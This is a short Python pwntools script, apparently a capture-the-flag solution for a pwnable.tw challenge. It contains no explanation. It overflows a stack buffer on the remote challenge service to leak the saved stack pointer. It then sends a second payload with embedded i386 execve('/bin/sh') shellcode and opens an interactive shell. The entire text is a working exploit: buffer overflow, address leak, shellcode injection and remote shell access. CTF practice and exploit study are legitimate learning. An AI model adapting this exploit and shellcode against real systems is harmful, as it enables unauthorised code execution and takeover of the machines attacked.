from pwn import *

p = remote('chall.pwnable.tw', 10000)
context.arch = 'i386'

shellcode = (b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')

p.recvuntil('CTF:')
payload1 = b'a'*20 + p32(0x08048087)
p.send(payload1)

saved_esp = u32(p.recv()[:4])
payload2 = b'b'*0x14 + p32(saved_esp+20) + shellcode
p.send(payload2)

p.interactive()

